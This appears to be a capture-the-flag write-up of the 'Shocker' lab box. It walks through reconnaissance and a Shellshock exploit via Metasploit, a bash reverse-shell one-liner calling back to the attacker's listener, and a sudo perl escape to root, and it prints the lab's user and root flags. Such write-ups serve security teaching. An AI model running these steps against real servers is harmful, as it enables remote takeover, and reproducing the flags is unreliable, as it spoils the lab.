
## CTF Writeup: Shocker

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -oN nmap.txt 10.129.74.63               
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-20 06:36 -0500
Nmap scan report for 10.129.74.63
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
```

The TCP Scan revealed SSH up on port 2222 & an apache webserver running on port 80. 

Started with accessing the webservice in the browser & got greeted with an picture. Let's download it locally to extract metadata and potential hidden information inside the picture.

```
exiftool bug.jpg                                       
ExifTool Version Number         : 13.55
File Name                       : bug.jpg
Directory                       : .
File Size                       : 37 kB
File Modification Date/Time     : 2026:09:20 06:39:29-05:00
File Access Date/Time           : 2026:09:20 06:39:29-05:00
File Inode Change Date/Time     : 2026:09:20 06:39:34-05:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90.
Image Width                     : 820
Image Height                    : 420
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 820x420
Megapixels                      : 0.344
```

This didn't provide us much information. Proceeded with trying to extract hidden data out of the picture.

This required an passphrase.

```
steghide extract -sf bug.jpg                                                      
Enter passphrase:
```

Tried bruteforcing an passphrase using the tool "stegseek", but wasn't able to find anything. I'm pretty sure this is not the way in. 

Proceeded with an feroxbuster scan to enumerate endpoints.

```
feroxbuster --url http://10.129.74.63
```

Wasn't able to enumerate anything. Decided to run the scan with another wordlist.

```
feroxbuster -u http://10.129.74.63/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Enumerated file extensions, besides an /cgi-bin directory I wasn't able to find anything. The /cgi-bin directory also was permission denied. But just out of intuition let's fuzz for file extensions, since usually scripts are stored in this directory.

```
feroxbuster --url http://10.129.74.63 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf
```

Ran another scan trying to enumerate file extensions with an different wordlist, but wasn't able to get an interesting hit aswell.

```
feroxbuster --url http://10.129.74.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf
```

Proceeded with enumerating subdomains.

Before that tho I mapped the domain "shocker.htb" to the target ip address in our local dns file.

```
echo "10.129.74.63 shocker.htb" | tee -a /etc/hosts
```

Tried enumerating subdomains, but also couldn't find anything.

```
ffuf -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shocker.htb" -u http://shocker.htb -fs 137
```

Ran another file extension scan on the previously discovered /cgi-bin endpoint and identified an interesting /user.sh directory.

```
feroxbuster --url http://shocker.htb/cgi-bin -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf,sh
```

The Bash script is displaying server information and is also updating itself, which means it get's automatically executed every second. Let's first try & download it onto our local machine to analyze it and after we could try and check if we can modify it or upload another user.sh which could give us RCE potentially.

```
Content-Type: text/plain

Just an uptime test script

 08:13:52 up  1:16,  0 users,  load average: 0.04, 0.17, 0.17
```

Downloaded the /user.sh script onto my local machine.

```
wget http://shocker.htb/cgi-bin/user.sh
```

I'm pretty sure this script could be vulnerable to the known Shellshock Vulnerability.

Decided to utilize an metasploit auxiliary scanner for this, which enumerates if the target is vulnerable or not to the ShellShock Vulnerability.

```
msfconsole -q
search shellshock
use scanner/http/apache_mod_cgi_bash_env
set RHOSTS shocker.htb
set TARGETURI /cgi-bin/user.sh
exploit
[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

We got an hit as user "shelly". Let's now abuse the exploit which is also inside metasploit!

```
search shellshock
use scanner/http/apache_mod_cgi_bash_env
set RHOSTS shocker.htb
set LHOST 10.10.14.57
set LPORT 80
set TARGETURI /cgi-bin/user.sh
exploit
```

Decided to get a better shell by starting an netcat listener on port 443.

```
nc -lvnp 443
```

Executed the following bash one-liner in the metasploit session in order to get RCE on the netcat listener.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/443 0>&1'
```

Retrieved user.txt in /home/shelly directory.

```
cac5a04f4fdfac550833e3c873d7a713
```

## Privilege Escalation

Checked sudo permissions of user "shelly".

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Searched up for an Privilege Escalation PoC on gtfobins.org and found one for the perl binary! 

```
shelly@Shocker:~$ sudo perl -e 'exec "/bin/sh"'
```

Gained root shell.

Retrieved root.txt in /root directory.

```
b08b21daa0a8bede20c6284b4877ba68
```